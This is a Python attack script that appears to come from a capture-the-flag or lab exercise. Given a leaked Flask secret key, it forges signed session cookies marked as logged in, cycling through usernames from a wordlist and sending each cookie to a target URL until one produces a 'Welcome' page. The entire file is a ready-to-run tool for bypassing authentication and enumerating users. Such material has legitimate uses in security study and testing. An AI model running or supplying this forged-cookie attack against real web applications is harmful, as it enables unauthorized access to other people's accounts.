#!/usr/bin/python3

from pwn import *
import requests, signal, sys, getopt
from flask.sessions import SecureCookieSessionInterface
import ast

def def_handler(sig, frame):
	print(palette.FAIL+"\n\n[!] Exiting...\n"+palette.ENDC)
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

class palette:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def usage():
	print(palette.HEADER + "Usage: " +  sys.argv[0] + " [OPTIONS]")
	print("\t--url       \t\t\tUrl" )
	print("\t--secret-key\t\t\tSecret Key")
	print("\t--wordlist  \t\t\tWordlist")
	print("\t--help      \t\t\tThis help menu\n"+ palette.ENDC)

	print(palette.WARNING + "Example:")
	print ("\t" + sys.argv[0] + " --url http://10.10.10.10/ --secret-key secret123 --wordlist /usr/share/wordlists/user.txt")
	print ("\t" + sys.argv[0] + " -u http://10.10.10.10/ -s secret123 -w /usr/share/wordlists/user.txt" + palette.ENDC)
	sys.exit(1)


def fuzzing(url, wordlist, secret):
	main_url = url
	secret_key = secret
	u = open(wordlist, "r")
	ses = requests.session()
	p1 = log.progress(f"{palette.OKBLUE}Fuzzing{palette.ENDC}")
	p1.status(f"{palette.OKCYAN}Starting the fuzz..{palette.ENDC}")
	sleep(2)

	for user in u.readlines():
		user = user.strip('\n')
		p1.status(f"{palette.OKGREEN}Testing with user {user}{palette.ENDC}")
		app = MockApp(secret_key)

		session_cookie_structure = {
			"logged_in": True,
			"username": "%s" %user
		}

	#session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
		si = SecureCookieSessionInterface()
		s = si.get_signing_serializer(app)
		cookie = s.dumps(session_cookie_structure)

		headers = {
			'cookie': 'session=%s' %cookie
		}

		r = ses.get(main_url, headers=headers)
		if "Welcome" in r.text:
			p1.success("User Found -> %s" %user)
			break

if __name__ == '__main__':
	url = None
	secret=None
	wordlist = None
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hu:w:s:", ["url=","secret-key=","wordlist=","help"])
	except (getopt.GetoptError, err):
		print(err)
		sys.exit(-1)
	for o, a in opts:
		if o in ("-u", "--url"):
			url = a
		elif o in ("-s", "--secret-key"):
			secret = a
		elif o in ("-w", "--wordlist"):
			wordlist = a
		elif o in ("-h", "--help"):
			usage()
			sys.exit()
		else:
			assert False, "unhandled option"
			sys.exit(-1)

	argc = len(sys.argv)
	if argc != 7:
		usage()
		sys.exit(0)

	fuzzing(url, wordlist, secret)
